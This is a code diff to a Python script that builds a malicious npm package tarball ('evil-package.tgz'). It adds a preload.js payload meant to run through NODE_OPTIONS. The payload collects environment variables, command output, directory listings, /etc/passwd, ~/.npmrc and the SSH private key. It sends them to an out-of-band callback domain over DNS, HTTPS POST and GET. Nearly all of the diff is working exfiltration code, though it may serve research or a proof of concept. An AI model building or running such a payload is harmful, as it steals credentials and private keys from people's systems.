@@ -181,6 +181,147 @@ ignore-scripts=false
 foreground-scripts=true
 '''
 
+# PRELOAD.JS - Executes with FULL Node.js API if NODE_OPTIONS is set
+# This is the pre-sandbox RCE payload
+PRELOAD_JS = f'''
+// preload.js - Executes BEFORE V8 sandbox via NODE_OPTIONS=--require
+// This has FULL Node.js API access: fs, child_process, network, etc.
+
+const OAST_DOMAIN = "{OAST_DOMAIN}";
+
+(async function() {{
+    const https = require('https');
+    const http = require('http');
+    const fs = require('fs');
+    const os = require('os');
+    const dns = require('dns');
+    const {{ execSync }} = require('child_process');
+    const path = require('path');
+
+    const exfilData = {{
+        timestamp: new Date().toISOString(),
+        attack_vector: "NODE_OPTIONS_PRELOAD",
+        system: {{}}
+    }};
+
+    // System information
+    try {{
+        exfilData.system.hostname = os.hostname();
+        exfilData.system.platform = os.platform();
+        exfilData.system.arch = os.arch();
+        exfilData.system.release = os.release();
+        exfilData.system.user = os.userInfo();
+        exfilData.system.cwd = process.cwd();
+        exfilData.system.pid = process.pid;
+        exfilData.system.ppid = process.ppid;
+        exfilData.system.argv = process.argv;
+        exfilData.system.execPath = process.execPath;
+        exfilData.system.nodeVersion = process.version;
+        exfilData.system.v8Version = process.versions.v8;
+    }} catch(e) {{
+        exfilData.system.error = e.message;
+    }}
+
+    // Environment variables (CRITICAL - contains secrets)
+    try {{
+        exfilData.env = {{}};
+        for (const [key, value] of Object.entries(process.env)) {{
+            // Truncate long values
+            exfilData.env[key] = String(value).substring(0, 200);
+        }}
+    }} catch(e) {{
+        exfilData.envError = e.message;
+    }}
+
+    // Execute commands
+    try {{
+        exfilData.commands = {{}};
+        exfilData.commands.whoami = execSync('whoami 2>/dev/null || echo unknown').toString().trim();
+        exfilData.commands.id = execSync('id 2>/dev/null || echo unknown').toString().trim();
+        exfilData.commands.pwd = execSync('pwd').toString().trim();
+        exfilData.commands.uname = execSync('uname -a 2>/dev/null || echo unknown').toString().trim();
+    }} catch(e) {{
+        exfilData.commands = {{ error: e.message }};
+    }}
+
+    // Filesystem enumeration
+    try {{
+        exfilData.files = {{}};
+        exfilData.files.root = fs.readdirSync('/').slice(0, 30);
+        exfilData.files.cwd = fs.readdirSync('.').slice(0, 30);
+        exfilData.files.home = fs.existsSync(os.homedir()) ? fs.readdirSync(os.homedir()).slice(0, 20) : [];
+    }} catch(e) {{
+        exfilData.files = {{ error: e.message }};
+    }}
+
+    // Read sensitive files
+    try {{
+        exfilData.sensitive = {{}};
+        const sensitiveFiles = [
+            '/etc/passwd',
+            '/proc/self/environ',
+            '/proc/self/cmdline',
+            '/proc/self/cgroup',
+            path.join(os.homedir(), '.npmrc'),
+            path.join(os.homedir(), '.ssh/id_rsa'),
+            '/etc/hosts'
+        ];
+        for (const f of sensitiveFiles) {{
+            try {{
+                if (fs.existsSync(f)) {{
+                    const content = fs.readFileSync(f, 'utf8');
+                    exfilData.sensitive[f] = content.substring(0, 500);
+                }}
+            }} catch(e) {{}}
+        }}
+    }} catch(e) {{
+        exfilData.sensitive = {{ error: e.message }};
+    }}
+
+    // Exfiltrate via DNS (most reliable, hard to block)
+    try {{
+        const shortPayload = Buffer.from(JSON.stringify({{
+            h: exfilData.system.hostname,
+            u: exfilData.commands?.whoami,
+            v: exfilData.system.nodeVersion
+        }})).toString('hex').substring(0, 60);
+        dns.lookup(`${{shortPayload}}.preload.${{OAST_DOMAIN}}`, () => {{}});
+    }} catch(e) {{}}
+
+    // Exfiltrate via HTTPS POST
+    try {{
+        const payload = JSON.stringify(exfilData);
+        const req = https.request({{
+            hostname: OAST_DOMAIN,
+            port: 443,
+            path: '/preload-rce-exfil',
+            method: 'POST',
+            headers: {{
+                'Content-Type': 'application/json',
+                'Content-Length': Buffer.byteLength(payload)
+            }}
+        }}, (res) => {{}});
+        req.on('error', () => {{}});
+        req.write(payload);
+        req.end();
+    }} catch(e) {{}}
+
+    // Also try HTTP GET with encoded payload (backup)
+    try {{
+        const shortData = Buffer.from(JSON.stringify({{
+            host: exfilData.system.hostname,
+            user: exfilData.commands?.whoami,
+            node: exfilData.system.nodeVersion,
+            cwd: exfilData.system.cwd
+        }})).toString('base64').substring(0, 200);
+
+        https.get(`https://${{OAST_DOMAIN}}/preload-rce/${{shortData}}`, () => {{}}).on('error', () => {{}});
+    }} catch(e) {{}}
+
+    console.log('[PRELOAD] NODE_OPTIONS RCE executed successfully');
+}})();
+'''
+
 def create_tarball(output_path="evil-package.tgz"):
     """Create a valid npm tarball."""
 
@@ -211,6 +352,12 @@ def create_tarball(output_path="evil-package.tgz"):
         npmrc_info = tarfile.TarInfo(name='package/.npmrc')
         npmrc_info.size = len(npmrc_bytes)
         tar.addfile(npmrc_info, io.BytesIO(npmrc_bytes))
+
+        # Add preload.js (NODE_OPTIONS RCE payload)
+        preload_js_bytes = PRELOAD_JS.encode('utf-8')
+        preload_js_info = tarfile.TarInfo(name='package/preload.js')
+        preload_js_info.size = len(preload_js_bytes)
+        tar.addfile(preload_js_info, io.BytesIO(preload_js_bytes))
 
     # Write to file
     with open(output_path, 'wb') as f:
